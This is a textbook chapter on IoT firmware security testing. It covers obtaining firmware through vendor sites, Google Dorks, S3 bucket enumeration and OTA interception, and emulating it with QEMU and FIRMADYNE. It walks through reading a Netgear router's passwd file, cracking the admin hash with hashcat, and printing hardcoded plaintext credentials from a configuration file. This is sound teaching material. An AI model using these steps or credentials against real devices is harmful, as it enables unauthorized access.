<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="207" id="Page_207"/>9</span><br/>
<span class="ChapterTitle">Firmware Hacking</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">The firmware is the software piece that links the device’s hardware layer to its main software layer. A vulnerability in this part of the device can have a tremendous impact on all the device functionalities. As a result, it’s crucial to identify and mitigate firmware vulnerabilities to secure IoT devices. </p>
<p>In this chapter, we explore what firmware is and how we can retrieve it and then analyze it for vulnerabilities. We start by finding user credentials in the firmware’s filesystem. Then we emulate some of the firmware’s compiled binaries, along with the entire firmware, to perform dynamic analysis. We also modify a publicly available firmware to add a backdoor mechanism and discuss how to spot a vulnerable firmware update service.</p>
<h2 id="h1-500907c09-0001"><span epub:type="pagebreak" title="208" id="Page_208"/>Firmware and Operating Systems</h2>
<p class="BodyFirst">Firmware is a type of software that provides communication and control over a device’s hardware components. It’s the first piece of code that a device runs. Usually, it boots the operating system and provides very specific runtime services for programs by communicating with various hardware components. Most, if not all, electronic devices have firmware. </p>
<p>Although firmware is a simpler and more reliable piece of software than operating systems, it’s also more restrictive and is designed to support only specific hardware. In contrast, many IoT devices run remarkably advanced, complex operating systems that support a large family of products. For example, IoT devices based on Microsoft Windows typically use operating systems such as Windows 10 IoT Core, Windows Embedded Industry (also known as POSReady or WEPOS), and Windows Embedded CE. IoT devices based on embedded Linux variants often use operating systems such as Android Things, OpenWrt, and Raspberry Pi OS. On the other hand, IoT devices designed to serve real-time applications that need to process data with specific time constraints and without buffer delays are usually based on real-time operating systems (RTOS), such as BlackBerry QNX, Wind River VxWorks, and NXP MQX mBed. Additionally, “bare-metal” IoT devices, designed to support simple microcontroller-based applications, typically execute assembly instructions directly on the hardware without advanced operating system scheduling algorithms to distribute the system resources. Nevertheless, each of these implementations has its own boot sequence with compatible bootloaders.</p>
<p>In less complicated IoT devices, the firmware might play the part of the operating system. Devices store firmware in nonvolatile memory, such as ROM, EPROM, or flash memory. </p>
<p>It’s important to examine the firmware and then attempt to modify it, because we can uncover many security issues during this process. Users often alter firmware to unlock new features or customize it. But with the same tactics, attackers can gain a better understanding of the system’s inner workings or even exploit a security vulnerability.</p>
<h2 id="h1-500907c09-0002">Obtaining Firmware</h2>
<p class="BodyFirst">Before you can reverse engineer a device’s firmware, you must find a way to gain access to it. Usually, there’s more than one method of doing so, depending on the device. In this section, we’ll cover the most popular firmware extraction methods according to the OWASP Firmware Security Testing Methodology (FSTM), which you can find at <a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/" class="LinkURL">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/</a>.</p>
<p>Often, the easiest way to find the firmware is to explore the vendor’s support site. Some vendors make their firmware available to the public to simplify troubleshooting. For example, the networking equipment manufacturer TP-Link provides a repository of firmware files from routers, cameras, and other devices on its website. </p>
<p><span epub:type="pagebreak" title="209" id="Page_209"/>If the firmware for the specific device isn’t published, try asking the vendor for it. Some vendors might simply provide you with the firmware. You could directly contact the development team, the manufacturer, or another of the vendor’s clients. Make sure you always verify that the person you contacted has the vendor’s permission to share the firmware with you. It’s definitely worth trying to acquire a development and a release build. Doing so will make your testing more effective, because you’ll be able to see the differences between the two builds. Also, some protection mechanisms might be removed in the development build. For example, Intel RealSense provides the production and development firmware of its cameras at <a href="https://dev.intelrealsense.com/docs/firmware-releases/" class="LinkURL">https://dev.intelrealsense.com/docs/firmware-releases/</a>. </p>
<p>Sometimes you might have to build the firmware manually. This is a dreaded practice for some, but a solution is a solution. The firmware source code might be publicly accessible, especially in open source projects. In these situations, it might be possible to build the firmware by following manufacturer published walkthroughs and instructions. The OpenWrt operating system used in Chapter 6 is one such open source firmware project and is primarily found in embedded devices to route network traffic. For example, the firmware of the GL.iNet routers is based on OpenWrt.</p>
<p>Another common approach is to explore the powerful search engines, like Google using Google Dorks<em>. </em>With the proper queries, you can find pretty much anything online. Search Google for binary file extensions hosted on file-sharing platforms, such as MediaFire, Dropbox, Microsoft OneDrive, Google Drive, or Amazon Drive. It’s common to come across firmware images uploaded by customers to message boards or customer and corporate blogs. Also look at the comment section of sites for communication between customers and manufacturers. You might find information about how to get the firmware, or you might even find that the manufacturer sent the customer a compressed file or link to download the firmware from a file-sharing platform. Here’s an example of a Google Dork for locating firmware files for Netgear devices:</p>
<pre><code>intitle:"Netgear"  intext:"Firmware Download"</code></pre>
<p>The <code>intitle</code> parameter specifies text that must exist in the title of the page, whereas the <code>intext</code> parameter specifies text that must exist in the page content. This search returned the results shown in <a id="figureanchor9-1" href="#figure9-1">Figure 9-1</a>. </p>
<p>In addition, don’t ignore the possibility of finding exposed cloud storage locations. Search Amazon S3 buckets; with enough luck, you could find the firmware in a vendor’s unprotected bucket. (For legal reasons, make sure the buckets weren’t exposed unintentionally and that the vendor has granted you permission to access any existing files.) The S3Scanner tool can enumerate a vendor’s Amazon S3 buckets. The tool is written in Python 3, which is pre-installed in Kali Linux. You can download the application using the <code>git</code> command:</p>
<pre><code>$ <b>git clone https://github.com/sa7mon/S3Scanner</b></code></pre>
<span epub:type="pagebreak" title="210" id="Page_210"/><figure>
<img src="Images/f09001.png" alt="f09001" width="562" height="290"/>
<figcaption><p><a id="figure9-1">Figure 9-1:</a> Discovering firmware links for Netgear devices using a Google Dork  </p></figcaption>
</figure>
<p>Then navigate in the <em>application</em> folder and install the required dependencies using the <code>pip3</code> command, which is also available in Kali Linux:</p>
<pre><code># <b>cd S3Scanner</b>
# <b>pip3 install -r requirements.txt</b></code></pre>
<p>Now you can search for a vendor’s Amazon S3 buckets and enumerate which of them provide access to firmware:</p>
<pre><code>$ <b>python3 s3scanner.py vendor_potential_buckets.txt</b><b> </b>
2020-05-01 11:16:42   Warning: AWS credentials not configured. Open buckets will be shown as closed. Run: `aws configure` to fix this.
2020-05-01 11:16:45   [found] : netgear | AccessDenied | ACLs: unknown - no aws creds
2020-05-01 11:16:46   [not found] : netgear-dev
2020-05-01 11:16:46   [not found] : netgear-development
2020-05-01 11:16:46   [not found] : netgear-live
2020-05-01 11:16:47   [not found] : netgear-stag
2020-05-01 11:16:47   [not found] : netgear-staging
2020-05-01 11:16:47   [not found] : netgear-prod
2020-05-01 11:16:48   [not found] : netgear-production
2020-05-01 11:16:48   [not found] : netgear-test
2020-05-01 11:16:52   [found] : tplink | AccessDenied | ACLs: unknown - no aws creds
2020-05-01 11:16:52   [not found] : tplinl-dev </code></pre>
<p>The parameter <code>vendor_potential_buckets.txt</code> specifies a file of potential bucket names for the tool to try. You can create your own similar custom file and provide vendor names followed by popular suffixes for S3 buckets, such as <code>-dev</code>, <code>-development</code>, <code>-live</code>, <code>-staging</code>, and <code>-prod</code>. The tool initially outputs a warning notification that your AWS credentials are missing, but this is expected and you can ignore it. Then the tool outputs the discovered S3 buckets followed by their access status.</p>
<p>If the device comes with companion software, it might be worth trying the application analysis approach. By analyzing the device’s mobile companion apps or <em>thick clients</em>—fully functional computers that don’t require <span epub:type="pagebreak" title="211" id="Page_211"/>a network connection to operate—you might pick up hardcoded endpoints that the applications communicate with. One of those endpoints could be the one used to download the firmware automatically during the update process. Regardless of whether or not this endpoint is authenticated, you should be able to download the firmware by analyzing the clients. You can find a methodology for analyzing such apps in Chapter 14.</p>
<p>For devices that still receive updates and bug fixes from the manufacturer, you can often perform an effective man-in-the-middle attack during the OTA updates. These updates are pushed over the network channel from a central server, or clusters of servers, to every connected device. Depending on the complexity of the application logic that downloads the firmware, intercepting the traffic might be the easiest solution. To do that, you’ll need to have a trusted certificate installed on the device (assuming the transfer occurs over HTTPS) and intercept the traffic using a network sniffer, poisoning technique (such as ARP cache poisoning), and proxy that can dump binary communication to a file. </p>
<p>In many devices, it might also be possible to dump the firmware using the device bootloader. The bootloader is usually accessible in many ways, such as through embedded serial RS232 ports, using special keyboard shortcuts, or over the network. Additionally, in most consumer devices,  the bootloader is programmed to allow flash memory read and write operations.</p>
<p>If the hardware contains exposed programming interfaces such as UART, JTAG, and SPI, try connecting to these interfaces directly to read the flash memory. Chapters 7 and 8 include a detailed explanation of how to spot and use these interfaces.</p>
<p>The last and most difficult method is to extract the firmware directly from either the flash chip (through SPI, for example) or the <em>microcontroller unit (MCU)</em>. The MCU is a single chip embedded on the device board that contains the CPU, memory, a clock, and a control unit. You’ll need a chip programmer to do this.</p>
<h2 id="h1-500907c09-0003">Hacking a Wi-Fi Modem Router </h2>
<p class="BodyFirst">In this section, we’ll target the firmware of a very popular Wi-Fi modem router, the Netgear D6000. We’ll first extract this firmware’s filesystem and search it for user credentials. Then we’ll emulate it for dynamic analysis. </p>
<p>To find this firmware, navigate to the vendor’s site and find the support page for the device model (<a href="https://www.netgear.com/support/product/D6000.aspx" class="LinkURL">https://www.netgear.com/support/product/D6000.aspx</a>).  You should see a list of available firmware and software downloads (<a id="figureanchor9-2" href="#figure9-2">Figure 9-2</a>).</p>
<p>Download the files. Because the firmware is in a compressed format, use the <code>unzip</code> command to retrieve it. You can install <code>unzip </code>using <code>apt-get</code>:</p>
<pre><code>$ <b>mkdir</b><b> d6000 &amp;&amp; cd d6000</b>
$ <b>wget</b><b> </b><b>http://www.downloads.netgear.com/files/GDC/D6000/D6000_V1.0.0.41_1.0.1_FW.zip</b>
<b>unzip D6000_V1.0.0.41_1.0.1_FW.zip</b></code></pre>
<span epub:type="pagebreak" title="212" id="Page_212"/><figure>
<img src="Images/f09002.png" alt="f09002" width="614" height="250"/>
<figcaption><p><a id="figure9-2">Figure 9-2:</a> Netgear D6000 support page</p></figcaption>
</figure>
<p>The <code>wget </code>command is a Unix utility that downloads files from the web in a noninteractive way. Without any additional arguments, <code>wget</code> will save the file in the current working directory. The <code>unzip</code> utility then creates a folder called <em>D6000_V1.0.0.41_1.0.1_FW</em> that contains two files: <em>D6000-V1.0.0.41_1.0.1.bin</em>, which is the device firmware, and <em>D6000_V1.0.0.41_1.0.1_Software_Release_Notes.html</em>, which contains vendor’s notes for manually installing this firmware on the device.</p>
<p>Once you’ve acquired the firmware, you can analyze it for security issues.</p>
<h3 id="h2-500907c09-0001">Extracting the Filesystem</h3>
<p class="BodyFirst">The firmware for most consumer-grade routers contains the device’s filesystem in a compressed format. Sometimes, the firmware is compressed several times using various algorithms (such as LZMA and LZMA2). Let’s extract this filesystem, mount it, and search its contents for security vulnerabilities. To locate the filesystem in the firmware file, use <code>binwalk</code>, which is pre-installed in Kali Linux:</p>
<pre><code>$ <b>binwalk</b><b> -e</b><b> -M</b><b> D6000-V1.0.0.41_1.0.1.bin</b></code></pre>
<p>The <code>-e</code> parameter extracts any identified file from the firmware, such as the bootloader and the filesystem. The <code>-M</code> parameter recursively scans extracted files and performs a signature analysis to identify file types based on common patterns.  But beware; if <code>binwalk</code> can’t correctly identify the file types, it can sometimes fill up your hard disk. You should now have a new folder named <em>_D6000-V1.0.0.41_1.0.1.bin.extracted</em> that contains the extracted contents.</p>
<p>Note that we used binwalk version 2.1.2-a0c5315. Some earlier versions couldn’t properly extract the filesystem. We recommend that you use the latest binwalk version, which is available on GitHub at <a href="https://github.com/ReFirmLabs/binwalk/" class="LinkURL">https://github.com/ReFirmLabs/binwalk/</a>.</p>
<h3 id="h2-500907c09-0002"><span epub:type="pagebreak" title="213" id="Page_213"/>Statically Analyzing the Filesystem Contents</h3>
<p class="BodyFirst">Now that we’ve extracted the filesystem, we can navigate through the files and attempt to find some useful information. A good approach is to begin by searching for low-hanging fruit, such as credentials stored in configuration files or outdated and vulnerable versions of common binaries with public advisories. Look for any files called <em>passwd</em> or <em>shadow</em>, which often contain information for all user accounts on the system, including the users’ passwords. You can do this using common utilities like <code>grep</code> or <code>find</code> that come pre-installed in any Unix system:</p>
<pre><code>~/d600/_D6000-V1.0.0.41_1.0.1.bin.extracted$ <b>find </b><b>.</b><b> -name </b><b>passwd</b> 
./squashfs-root/usr/bin/passwd
./squashfs-root/usr/etc/passwd</code></pre>
<p>Using the <code>.</code> command, we instruct the Find tool to search the current working directory for the file indicated by the <code>-name</code> parameter. In this case, we’re looking for a file named <em>passwd</em>.  As you can see, we’ve located two files with that name.</p>
<p>The <em>bin/passwd</em> binary file doesn’t give us useful information in its current form. On the other hand, the <em>etc/passwd</em> file is in a readable format. You can read it using the <code>cat</code> utility:</p>
<pre><code>$ <b>cat </b><b>.</b><b>/</b><b>squashfs</b><b>-root/</b><b>usr</b><b>/</b><b>etc</b><b>/passwd</b>
admin:$1$$iC.dUsGpxNNJGeOm1dFio/:0:0:root:/:/bin/sh$ </code></pre>
<p>The <em>etc/passwd</em> file contains a text-based database that lists the users who can authenticate to the system. Currently, there is only one entry, which is for the device’s administrator.  The entry has the following fields, divided by colons: the username, the hash of the user’s password, the user identifier, the group identifier, extra information about the user, the path of the user’s home folder, and the program executed on user login. Let’s turn our attention to the password hash <code>($1$$iC.dUsGpxNNJGeOm1dFio/)</code>. </p>
<h4 id="h3-500907c09-0001">Cracking the Device’s Admin Credentials</h4>
<p class="BodyFirst">Use <code>hashid</code> to detect the admin password’s hash type. This tool is pre-installed in Kali Linux, and it can identify more than 220 unique types of hashes via regular expressions:</p>
<pre><code>$ <b>hashid</b> <b>$1</b><b>$$iC.dUsGpxNNJGeOm1dFio/</b>
Analyzing '$1$$iC.dUsGpxNNJGeOm1dFio/'
<b>[+] MD5 Crypt</b>
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 </code></pre>
<p>According to the output, we’ve found an <code>MD5 Crypt</code> hash. Now we can try to crack this password using a brute-forcing tool, like john or hashcat. These tools cycle through a list of potential passwords, looking for one that matches the hash.</p>
<span epub:type="pagebreak" title="214" id="Page_214"/><pre><code>$ <b>hashcat</b><b> -a 3 -m </b><b>500 </b><b>.</b><b>/</b><b>squashfs</b><b>-root/</b><b>usr</b><b>/</b><b>etc</b><b>/passwd</b>
…
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$$iC.dUsGpxNNJGeOm1dFio/
Time.Started.....: Sat Jan 11 18:36:43 2020 (7 secs)
Time.Estimated...: Sat Jan 11 18:36:50 2020 (0 secs)
Guess.Mask.......: ?1?2?2 [3]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined 
Guess.Queue......: 3/15 (20.00%)
Speed.#2.........:     2881 H/s (0.68ms) @ Accel:32 Loops:15 Thr:8 Vec:1
Speed.#3.........:     9165 H/s (1.36ms) @ Accel:32 Loops:15 Thr:64 Vec:1
Speed.#*.........:    12046 H/s
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 80352/80352 (100.00%)
Rejected.........: 0/80352 (0.00%)
Restore.Point....: 205/1296 (15.82%)
Restore.Sub.#2...: Salt:0 Amplifier:61-62 Iteration:990-1000
Restore.Sub.#3...: Salt:0 Amplifier:61-62 Iteration:990-1000
Candidates.#2....: Xar -&gt; Xpp
Candidates.#3....: Xww -&gt; Xqx

$1$$iC.dUsGpxNNJGeOm1dFio/:1234                  [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; </code></pre>
<p>The <code>-a</code> parameter defines the attack mode used to guess the plaintext passwords. We select mode <code>3</code> to perform a brute-force attack. Mode <code>0</code> would perform a wordlist attack, and mode <code>1</code> would perform the <em>combinator attack</em>, which appends each word in a dictionary to each word in another dictionary. You could also perform more specialized attacks using modes 6 and 7. For example, if you knew that the last character in a password was a number, you could configure the tool to try passwords that only end in a number.</p>
<p>The <code>-m</code> parameter defines the type of hash we’re trying to crack, and <code>500</code><var/>represents<var/>an MD5 Crypt. You can find more details about the supported hash types on the hashcat web page (<a href="https://hashcat.net/hashcat/" class="LinkURL">https://hashcat.net/hashcat/</a>).</p>
<p>We recovered the password <code>1234</code>. It took hashcat less than a minute to crack it! </p>
<h4 id="h3-500907c09-0002">Finding Credentials in Configuration Files</h4>
<p class="BodyFirst">Using a similar approach to the one at the beginning of this section where we located the <em>passwd</em> file, let’s search the firmware for other secrets. You can often find hardcoded credentials in the configuration files, which end in the <em>cfg</em> extension. The device uses these files to configure the initial state of a service. </p>
<p>Let’s search for files with the <em>cfg</em> extension using the <code>find</code> command:</p>
<pre><code>$ <b>find .</b><b> -name *</b><b>cfg</b>
./userfs/profile.cfg
./userfs/romfile.cfg
./boaroot/html/NETGEAR_D6000.cfg
<span epub:type="pagebreak" title="215" id="Page_215"/>./boaroot/html/romfile.cfg
./boaroot/html/NETGEAR_D6010.cfg
./boaroot/html/NETGEAR_D3610.cfg
./boaroot/html/NETGEAR_D3600.cfg</code></pre>
<p>You can then look through the configuration files for relevant information. In <em>romfile.cfg</em>, for example, we find a number of hardcoded user account credentials:</p>
<pre><code>$ <b>cat ./</b><b>squashfs</b><b>-root/</b><b>userfs</b><b>/</b><b>romfile.cfg</b>
…
&lt;Account&gt;
    &lt;Entry0 username="admin" web_passwd="password" console_passwd="password" display_mask="FF FF F7 FF FF FF FF FF FF" old_passwd="password" changed="1" temp_passwd="password" expire_time="5" firstuse="0" blank_password="0"/&gt;
    &lt;Entry1 username="qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyui" web_passwd="12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678" display_mask="F2 8C 84 8C 8C 8C 8C 8C 8C"/&gt;
    &lt;Entry2 username="anonymous" web_passwd="anon@localhost" display_mask="FF FF F7 FF FF FF FF FF FF"/&gt;
&lt;/Account&gt;
…</code></pre>
<p>We’ve discovered three new users called <code>admin</code>, <code>qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyui</code>, and <code>anonymous</code> with their corresponding passwords, which are in plaintext this time. </p>
<p>Remember that we’ve already cracked the credentials for the admin account, yet the password we recovered doesn’t match the one listed here. It’s likely that the first password we found will be replaced by the one in the configuration file on the first boot. Vendors often use configuration files to perform security-related changes when initializing a device. This approach also permits vendors to deploy the same firmware in devices that support different functionalities and require specific settings to operate successfully.   </p>
<h4 id="h3-500907c09-0003">Automating Firmware Analysis</h4>
<p class="BodyFirst">The Firmwalker tool can automate the information gathering and analysis process we just walked through. Install it from <a href="https://github.com/craigz28/firmwalker/" class="LinkURL">https://github.com/craigz28/firmwalker/</a>, and then run it:</p>
<pre><code>$ <b>git clone https://github.com/craigz28/firmwalker</b>
$ <b>cd </b><b>firmwalker</b>
$ <b>./firmwalker.sh ../d6000/_D6000-V1.0.0.41_1.0.1.bin.extracted/</b><b>squashfs</b><b>-root/</b>
***Firmware Directory***
../d6000/_D6000-V1.0.0.41_1.0.1.bin.extracted/squashfs-root/
***Search for password files***
##################################### passwd
/usr/etc/passwd
/usr/bin/passwd
<span epub:type="pagebreak" title="216" id="Page_216"/>##################################### shadow
##################################### *.psk
***Search for Unix-MD5 hashes***
***Search for SSL related files***
##################################### *.crt
/usr/etc/802_1X/Certificates/client.crt
##################################### *.pem
/usr/etc/key.pem
/usr/etc/802_1X/CA/cacert.pem
/usr/etc/cert.pem
…
/usr/etc/802_1X/PKEY/client.key
…
##################################### *.cfg
…
/userfs/romfile.cfg
…</code></pre>
<p>The tool automatically located the files we identified manually, among others that also look suspicious. We’ll leave the examination of these new files as an exercise for you to complete. </p>
<p>Netgear patched the vulnerability caused by the hardcoded credentials in the latest firmware and published a security advisory (<a href="https://kb.netgear.com/30560/CVE-2015-8288-Use-of-Hard-coded-Cryptographic-Key/" class="LinkURL">https://kb.netgear.com/30560/CVE-2015-8288-Use-of-Hard-coded-Cryptographic-Key/</a>) that informs customers about this issue.</p>
<h3 id="h2-500907c09-0003">Firmware Emulation</h3>
<p class="BodyFirst">In this section, we’ll show you how to emulate a firmware. Once we’ve done so, we can perform dynamic analysis tests that are only possible while the firmware is operating normally. We’ll use two emulation techniques: binary emulation using <em>Quick Emulator (QEMU)</em> and whole firmware emulation using FIRMADYNE. QEMU is an open source machine emulator and analyzer that works with multiple operating systems and programs, whereas FIRMADYNE (<a href="https://github.com/firmadyne/firmadyne/" class="LinkURL">https://github.com/firmadyne/firmadyne/</a>) is a platform for automating the emulation and dynamic analysis of Linux-based firmware. </p>
<h4 id="h3-500907c09-0004">Binary Emulation</h4>
<p class="BodyFirst">Emulating a single binary in the firmware is a quick way to infer the related business logic and dynamically analyze the provided functionality for security vulnerabilities. This approach also allows you to use specialized binary analysis tools, disassemblers, and fuzzing frameworks that you usually can’t install in environments with limited resources. Those environments include embedded systems or those that aren’t efficient to use with large and complex inputs, such as a complete device firmware. Unfortunately, you might not be able to emulate binaries that have specialized hardware requirements and look for specific serial ports or device buttons. Also, you might have trouble emulating binaries that depend on shared libraries that get loaded at runtime or those that need to interact with the platform’s other binaries to operate successfully. </p>
<p><span epub:type="pagebreak" title="217" id="Page_217"/>To emulate a single binary, we first need to identify its endianness and the CPU architecture for which it was compiled. You can find the main binaries on Linux distributions in the<em> bin</em> folder and list them using the <code>ls</code> command, which is preinstalled in Kali Linux:</p>
<pre><code>$ <b>ls -</b><b>l .</b><b>/</b><b>squashfs</b><b>-root/bin/</b>
total 492
lrwxrwxrwx 1 root root      7 Jan 24  2015 ash -&gt; busybox
-rwxr-xr-x 1 root root 502012 Jan 24  2015 busybox
lrwxrwxrwx 1 root root      7 Jan 24  2015 cat -&gt; busybox
lrwxrwxrwx 1 root root      7 Jan 24  2015 chmod -&gt; busybox
…
lrwxrwxrwx 1 root root      7 Jan 24  2015 zcat -&gt; busybox</code></pre>
<p>The <code>-l</code> parameter displays extra information about the files, including the paths of <em>symbolic links</em> (references to other files or directories). As you can see, all binaries in the directory are symbolic links to the <em>busybox</em> executable. In limited environments, such as embedded systems, it’s very common to have only a single binary called <em>busybox</em>. This binary performs tasks similar to those of Unix-based operating system executables but uses fewer resources. Attackers have successfully targeted past versions of <em>busybox</em>, but the identified vulnerabilities have been mitigated in the latest versions.</p>
<p>To see the <em>busybox</em> executable’s file format, use the <code>file</code> command:</p>
<pre><code>$ <b>file .</b><b>/</b><b>squashfs</b><b>-root/bin/</b><b>busybox</b>
./squashfs-root/bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</code></pre>
<p>The executable file format is for the MIPS CPU architecture, which is very common in lightweight embedded devices. The <code>MSB</code> label in the output indicates that the executable follows a big-endian byte ordering (as opposed to an output containing the <code>LSB</code> label, which would indicate a little-endian byte ordering). </p>
<p>Now we can emulate the <em>busybox</em> executable using QEMU. Install it using <code>apt-get</code>:</p>
<pre><code>$ <b>sudo</b><b> apt-get install </b><b>qemu</b><b> </b><b>qemu</b><b>-user </b><b>qemu</b><b>-user-static </b><b>qemu</b><b>-system-arm </b><b>qemu</b><b>-system-</b><b>mips</b><b> qemu-system-x86 </b><b>qemu</b><b>-utils</b></code></pre>
<p>Because the executables are compiled for MIPS and follow the big-endian byte ordering, we’ll use QEMU’s <code>qemu-mips</code> emulator. To emulate little-endian executables, we would have to select the emulator with the <code>el</code> suffix, which in this case would be <code>qemu-mipsel:</code></p>
<pre><code>$ <b>qemu-mips</b><b> -</b><b>L .</b><b>/</b><b>squashfs</b><b>-root/ </b><b>./</b><b>squashfs</b><b>-root/bin/</b><b>zcat</b><b> </b>
zcat: compressed data not read from terminal.  Use -f to force it.</code></pre>
<p><span epub:type="pagebreak" title="218" id="Page_218"/>You can now perform the rest of the dynamic analysis by fuzzing, debugging, or even performing symbolic execution. You can learn more about these techniques in <em>Practical Binary Analysis</em> by Dennis Andriesse (No Starch Press, 2018).</p>
<h4 id="h3-500907c09-0005">Complete Firmware Emulation</h4>
<p class="BodyFirst">To emulate the whole firmware rather than a single binary, you can use an open source application called <code>firmadyne</code>. FIRMADYNE is based on QEMU, and it’s designed to perform all the necessary configurations of the QEMU environment and host system for you, simplifying the emulation. But note that FIRMADYNE isn’t always completely stable, especially when the firmware interacts with very specialized hardware components, such as device buttons or secure enclave chips. Those parts of the emulated firmware might not work correctly. </p>
<p>Before we use FIRMADYNE, we need to prepare the environment. The following commands install the packages that this tool needs to operate and clones its repository to our system.</p>
<pre><code>$ <b>sudo</b><b> apt-get install </b><b>busybox</b><b>-static </b><b>fakeroot</b><b> git </b><b>dmsetup</b><b> </b><b>kpartx</b><b> </b><b>netcat-openbsd</b><b> </b><b>nmap</b><b> python-psycopg2 python3-psycopg2 </b><b>snmp</b><b> </b><b>uml</b><b>-utilities util-</b><b>linux</b><b> </b><b>vlan</b>
$ <b>git clone --recursive https://github.com/firmadyne/firmadyne.git</b></code></pre>
<p>At this point, you should have a <em>firmadyne</em> folder on your system. To quickly set up the tool, navigate to the tool’s directory and run <em>./setup.sh</em>. Alternatively, you can manually set it up using the steps shown here. Doing so allows you to select the appropriate package managers and tools for your system. </p>
<p>You’ll also have to install a PostgreSQL database to store information used for the emulation. Create a FIRMADYNE user using the <code>-P</code> switch. In this example, we use <code>firmadyne</code> as the password, as recommended by the tool’s authors:</p>
<pre><code>$ <b>sudo</b><b> apt-get install </b><b>postgresql</b>
$ <b>sudo service postgresql start</b>
$ <b>sudo</b><b> -u </b><b>postgres</b><b> </b><b>createuser</b><b> -P </b><b>firmadyne</b><b> </b></code></pre>
<p>Then create a new database and load it with the database schema available in the <em>firmadyne</em> repository folder: </p>
<pre><code>$ <b>sudo</b><b> -u </b><b>postgres</b><b> </b><b>createdb</b><b> -O </b><b>firmadyne</b><b> firmware</b>
$ <b>sudo</b><b> -u </b><b>postgres</b><b> </b><b>psql</b><b> -d firmware </b><b>&lt; .</b><b>/</b><b>firmadyne</b><b>/database/schema</b></code></pre>
<p>Now that the database is set up, download the prebuilt binaries for all the FIRMADYNE components by running the <em>download.sh</em> script located in the repository folder. Using the prebuilt binaries will significantly reduce the overall setup time.</p>
<pre><code>$ <b>cd .</b><b>/</b><b>firmadyne</b><b>; ./download.sh</b></code></pre>
<p><span epub:type="pagebreak" title="219" id="Page_219"/>Then set the <code>FIMWARE_DIR</code> variable to point to the current working repository in the <em>firmadyne.config</em><code/>file located in the same folder. This change allows FIRMADYNE to locate the binaries in the Kali Linux filesystem. </p>
<pre><code>FIRMWARE_DIR=<b>/home/root/Desktop/</b><b>firmadyne</b>
…</code></pre>
<p>In this example, the folder is saved on the Desktop, but you should replace the path with the folder’s location on your system. Now copy or download the firmware for the D6000 device (obtained in “Hacking a Wi-Fi Modem Router” on page 211) into this folder:</p>
<pre><code>$ <b>wget</b><b> http://www.downloads.netgear.com/files/GDC/D6000/D6000_V1.0.0.41_1.0.1_FW.zip</b></code></pre>
<p>FIRMADYNE includes an automated Python script for extracting the firmware. But to use the script, you must first install Python’s <code>binwalk</code> module:</p>
<pre><code>$ <b>git clone https://github.com/ReFirmLabs/binwalk.git</b>
$ <b>cd </b><b>binwalk</b>
$ <b>sudo</b><b> python setup.py install</b></code></pre>
<p>We use the <code>python</code> command to initialize and set up <code>binwalk</code>. Next, we need two more <code>python</code> packages, which we can install using Python’s <code>pip</code> package manager:</p>
<pre><code>$ <b>sudo</b><b> -H pip install </b><b>git+https</b><b>://github.com/</b><b>ahupp</b><b>/python-magic</b>
$ <b>sudo</b><b> -H pip install </b><b>git+https</b><b>://github.com/</b><b>sviehb</b><b>/</b><b>jefferson</b></code></pre>
<p>Now you can use FIRMADYNE’s <em>extractor.py</em> script to extract the firmware from the compressed file:</p>
<pre><code>$ <b>.</b><b>/sources/extractor/extractor.py -b Netgear -</b><b>sql 127.0.0.1 -np -nk</b> <b>"D6000_V1.0.0.41_1.0.1_FW.zip" images</b>
&gt;&gt; Database Image ID: 1
/home/user/Desktop/firmadyne/D6000_V1.0.0.41_1.0.1_FW.zip &gt;&gt; MD5: 1c4ab13693ba31d259805c7d0976689a
&gt;&gt; Tag: 1
&gt;&gt; Temp: /tmp/tmpX9SmRU
&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True
&gt;&gt;&gt;&gt; Zip archive data, at least v2.0 to extract, compressed size: 9667454, uncompressed size: 9671530, name: D6000-V1.0.0.41_1.0.1.bin
&gt;&gt; Recursing into archive ...
/tmp/tmpX9SmRU/_D6000_V1.0.0.41_1.0.1_FW.zip.extracted/D6000-V1.0.0.41_1.0.1.bin
    &gt;&gt; MD5: 5be7bba89c9e249ebef73576bb1a5c33
    &gt;&gt; Tag: 1 <span class="CodeAnnotation">1</span>
    &gt;&gt; Temp: /tmp/tmpa3dI1c
    &gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True
    &gt;&gt; Recursing into archive ...
    &gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8252568
         bytes, 1762 inodes, blocksize: 131072 bytes, created: 2015-01-24 10:52:26
    Found Linux filesystem in /tmp/tmpa3dI1c/_D6000-V1.0.0.41_1.0.1.bin.extracted/squashfs-
    root! <span class="CodeAnnotation">2</span>
<span epub:type="pagebreak" title="220" id="Page_220"/>        &gt;&gt; Skipping: completed!
        &gt;&gt; Cleaning up /tmp/tmpa3dI1c...
&gt;&gt; Skipping: completed!
&gt;&gt; Cleaning up /tmp/tmpX9SmRU...</code></pre>
<p>The <code>-b</code> parameter specifies the name used to store the results of the extraction. We opted to use the firmware vendor’s name. The <code>-sql</code> parameter sets the location of the SQL database. Next, we use two flags recommended by the application’s documentation. The <code>-nk</code> parameter keeps any Linux kernel included in the firmware from being extracted, which will speed up the process. The<code> -np </code>parameter specifies that no parallel operation will be performed. </p>
